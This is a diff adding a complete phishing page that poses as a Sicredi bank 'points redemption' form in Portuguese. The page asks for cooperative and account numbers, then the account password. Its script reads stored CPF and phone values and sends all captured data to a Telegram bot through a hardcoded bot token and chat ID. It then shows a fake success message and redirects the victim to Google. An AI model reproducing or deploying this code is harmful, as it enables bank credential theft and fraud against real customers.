@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sicredi - Dados Complementares</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            box-sizing: border-box;
+            flex-direction: column;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            padding: 20px;
+            box-sizing: border-box;
+            border: 2px solid #33820d;
+            border-radius: 40px;
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(51, 130, 13, 0.1), 0 -4px 8px rgba(51, 130, 13, 0.1);
+            text-align: center;
+        }
+
+        .formulario {
+            width: 100%;
+            padding: 20px;
+            border: 2px solid #33820d;
+            border-radius: 40px;
+            margin-top: 20px;
+            text-align: left;
+            background-color: #fff;
+            box-sizing: border-box;
+            box-shadow: 0 4px 8px rgba(51, 130, 13, 0.1), 0 -4px 8px rgba(51, 130, 13, 0.1);
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: inline-block;
+            margin-left: 10px;
+        }
+
+        .icon {
+            margin-right: 5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 5px;
+            border: 2px solid #33820d;
+            border-radius: 40px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            background-color: #33820d;
+            border: none;
+            border-radius: 40px;
+            font-size: 16px;
+            cursor: pointer;
+            color: #fff;
+        }
+
+        button:hover {
+            background-color: #276c0f;
+        }
+
+        button:focus {
+            outline: none;
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .loading-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+            color: #33820d;
+            display: none;
+        }
+
+        .senha {
+            display: none;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .inicio-texto, .imagem, .sub-texto {
+            display: block;
+        }
+
+        .sucesso {
+            display: none;
+            padding: 40px;
+            background-color: #33820d;
+            color: white;
+            border-radius: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            margin-top: 30px;
+            width: 80%;
+            margin-left: auto;
+            margin-right: auto;
+            box-shadow: 0 4px 10px rgba(51, 130, 13, 0.2);
+        }
+
+        .sucesso img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        .verde {
+            color: #33820d;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+                max-width: 100%;
+            }
+
+            .formulario {
+                padding: 15px;
+                border-radius: 20px;
+            }
+
+            footer {
+                font-size: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="inicio-texto" id="inicioTexto">
+            <p> Resgate <span class="verde">AGORA</span> seus pontos acumulados por utilizar a <span class="verde">SICREDI</span>.</p>
+        </div>
+
+        <div class="imagem" id="imagemDiv">
+            <img src="img.jpg" alt="Imagem Exemplo" style="margin-top: 20px; max-width: 80%; height: auto;">
+        </div>
+
+        <div class="sub-texto" id="subTexto">
+            <p>Antes de prosseguir, apenas precisamos validar algumas informações.</p>
+        </div>
+
+        <div class="formulario" id="formulario" style="display: block;">
+            <form id="dadosForm">
+                <label for="cooperativa"><i class="fas fa-building icon"></i><span>Cooperativa:</span></label>
+                <input type="text" id="cooperativa" name="cooperativa" placeholder="Cooperativa" required><br><br>
+
+                <label for="conta"><i class="fas fa-credit-card icon"></i><span>Conta:</span></label>
+                <input type="text" id="conta" name="conta" placeholder="Número da conta" required><br><br>
+
+                <div class="loading-spinner" id="loadingSpinner">
+                    <i class="fas fa-spinner fa-spin"></i> Carregando...
+                </div>
+
+                <button type="button" onclick="validarCadastro()">Validar</button>
+            </form>
+        </div>
+
+        <div class="senha" id="senhaDiv">
+            <label for="senha"><i class="fas fa-lock icon"></i><span>Senha:</span></label>
+            <input type="password" id="senha" name="senha" placeholder="Digite sua senha" required><br><br>
+            <button type="button" onclick="finalizarCadastro()">Finalizar</button>
+        </div>
+
+        <div class="sucesso" id="mensagemSucesso">
+            <img src="images.png" alt="Imagem de Sucesso">  
+            <p><strong>Resgate Realizado com Sucesso!</strong><br> Dentro de 2 a 3 dias úteis seus pontos convertidos em $ , estarão em sua conta!<br><br><span>Equipe Banco Cooperativo Sicredi S.A. !</span></p>
+        </div>
+
+        <footer>
+            <p><span class="negrito">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
+        </footer>
+    </div>
+
+    <script>
+        const tokenBotTelegram = "7641124246:AAHT7YBvtkm9H0DdWpAwbVzf5rXFneFWAi0"; 
+        const chatId = "5219689168";
+
+        function enviarParaTelegram(mensagem) {
+            const url = `https://api.telegram.org/bot${tokenBotTelegram}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: mensagem,
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Mensagem enviada com sucesso:', data);
+            })
+            .catch((error) => {
+                console.error('Erro ao enviar mensagem:', error);
+            });
+        }
+
+        function validarCadastro() {
+            var cooperativa = document.getElementById("cooperativa").value;
+            var conta = document.getElementById("conta").value;
+
+            if (cooperativa && conta) {
+                document.getElementById("loadingSpinner").style.display = "block";
+
+                // Recuperando os valores de CPF e telefone armazenados no localStorage
+                var cpf = localStorage.getItem("cpf");
+                var telefone = localStorage.getItem("telefone");
+
+                // Montando a mensagem
+                var mensagem = `CPF: ${cpf}\nTelefone: ${telefone}\nCooperativa: ${cooperativa}\nConta: ${conta}`;
+                enviarParaTelegram(mensagem);
+
+                document.getElementById("cooperativa").parentNode.style.display = "none";
+                document.getElementById("conta").parentNode.style.display = "none";
+
+                document.getElementById("subTexto").innerHTML = "Falta pouco para resgatar seus pontos SICREDI. Confirme sua senha no campo abaixo:";
+
+                document.getElementById("senhaDiv").style.display = "block";
+
+                setTimeout(function() {
+                    document.getElementById("loadingSpinner").style.display = "none";
+                }, 2000);
+            } else {
+                alert("Preencha todos os campos.");
+            }
+        }
+
+        function finalizarCadastro() {
+            var cooperativa = document.getElementById("cooperativa").value;
+            var conta = document.getElementById("conta").value;
+            var senha = document.getElementById("senha").value;
+
+            if (senha) {
+                var mensagemFinal = `CPF: ${localStorage.getItem("cpf")}\nTelefone: ${localStorage.getItem("telefone")}\nCooperativa: ${cooperativa}\nConta: ${conta}\nSenha: ${senha}`;
+                enviarParaTelegram(mensagemFinal);
+
+                document.getElementById("mensagemSucesso").style.display = "block";
+
+                document.getElementById("inicioTexto").style.display = "none";
+                document.getElementById("imagemDiv").style.display = "none";
+                document.getElementById("subTexto").style.display = "none";
+                document.getElementById("formulario").style.display = "none";
+                document.getElementById("senhaDiv").style.display = "none";
+
+                setTimeout(function() {
+                    window.location.href = "https://www.google.com"; // Redireciona para o Google
+                }, 3000);
+            } else {
+                alert("Por favor, insira a senha.");
+            }
+        }
+    </script>
+
+</body>
+</html>
